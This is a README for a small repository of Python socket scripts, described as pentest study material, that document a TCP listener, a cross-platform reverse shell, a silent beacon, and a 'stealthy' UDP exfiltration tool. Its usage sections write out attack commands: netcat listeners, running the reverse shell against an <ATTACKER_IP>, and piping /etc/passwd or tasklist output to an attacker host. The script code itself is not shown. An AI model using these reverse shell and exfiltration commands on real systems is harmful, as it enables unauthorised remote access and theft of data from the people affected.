# Sockets in Python

This repository contains a collection of Python scripts that utilize the `socket` library for various networking tasks. These scripts were developed as a practical exercise while studying network programming and security concepts, inspired by courses from Solyd. The collection includes enhanced versions of standard examples, modified scripts for specific use cases, and original creations, all designed for educational and penetration testing study purposes.

## Scripts Overview

Here is a breakdown of each script, its purpose, and how to use it.

### 1. `server_tcp.py`

A robust and persistent TCP server designed to listen for and handle multiple client connections sequentially. It's ideal for use as a listener in penetration testing scenarios, logging all received data to a file.

**Features:**
* **Persistent Listener**: Accepts multiple clients without restarting.
* **Multi-Message Handling**: Manages continuous data streams from a single client.
* **Data Logging**: Saves all data received from clients to `server_log.txt`.
* **Graceful Shutdown**: Can be stopped cleanly with `Ctrl+C`.

**Usage:**
Run the server on your machine, and it will listen on `0.0.0.0` at port `4433`.
```bash
python3 server_tcp.py
````

-----

### 2\. `client_tcp.py`

A classic and highly practical TCP reverse shell. This script connects back to a listening server, and redirects the machine's standard input, output, and error streams to the socket, providing the attacker with a remote shell.

**Features:**

  * **Remote Shell**: Provides a remote command-line interface to the target machine.
  * **Cross-Platform**: Automatically selects `/bin/sh` for Linux or `cmd.exe` for Windows.
  * **Stable Connection**: Uses TCP for reliable, stream-based communication.

**Usage:**

1.  On the attacker's machine, start a listener (e.g., netcat or `server_tcp.py`):
    ```bash
    nc -lvnp 4444
    ```
2.  On the target machine, run the script with the attacker's IP and port:
    ```bash
    python3 client_tcp.py <ATTACKER_IP> 4444
    ```

-----

### 3\. `fast_client_tcp.py`

A minimal, "fire-and-forget" TCP client designed for quick connection tests. Its main purpose is to send a single "beacon" to a listener to confirm that a connection from a target machine is possible.

**Features:**

  * **Silent Failure**: If a connection cannot be established, the script exits silently without raising errors on the target machine.
  * **Minimalist**: Hardcoded IP and port for rapid execution without command-line arguments.
  * **Single Beacon**: Connects, sends a single message, and immediately closes the connection.

**Usage:**

1.  Edit the `HOST` and `PORT` variables inside the script.
2.  Start a listener on the attacker's machine.
3.  Run the script on the target machine:
    ```bash
    python3 fast_client_tcp.py
    ```

-----

### 4\. `client_udp.py`

A lean, single-packet UDP client. This script is designed to send one UDP datagram to a target and then exit. It's perfect for sending quick triggers, simple commands, or testing for UDP listeners without the overhead of a TCP connection.

**Features:**

  * **Command-Line Driven**: Target IP, port, and message are all passed as command-line arguments for maximum flexibility.
  * **Fire-and-Forget**: Sends one packet and exits immediately.
  * **Lightweight**: Uses UDP for a fast, connectionless transmission.

**Usage:**

```bash
python3 client_udp.py <TARGET_IP> <PORT> "<YOUR_MESSAGE>"
```

-----

### 5\. `pipe_udp.py`

An efficient data exfiltration tool that reads input from `stdin` and sends it line-by-line over UDP. This is ideal for quickly and covertly sending the output of other commands or the content of files to a remote listener.

**Features:**

  * **Stealthy Exfiltration**: Sends data directly over the network without writing to a temporary file.
  * **Flexible**: Can be piped with any command that produces text output.
  * **Connectionless**: Uses UDP for fast data transfer.

**Usage:**
On the attacker's machine, start a UDP listener to capture the output: `nc -ulvnp <PORT>`

On the target machine, pipe a command's output to the script:

```bash
# Example: Exfiltrate /etc/passwd content
cat /etc/passwd | python3 pipe_udp.py <ATTACKER_IP> <PORT>

# Example: Exfiltrate running processes on Windows
tasklist | python3 pipe_udp.py <ATTACKER_IP> <PORT>
```

## License

This project is licensed under the MIT License. See the `LICENSE` file for details.


by _r3n4n_
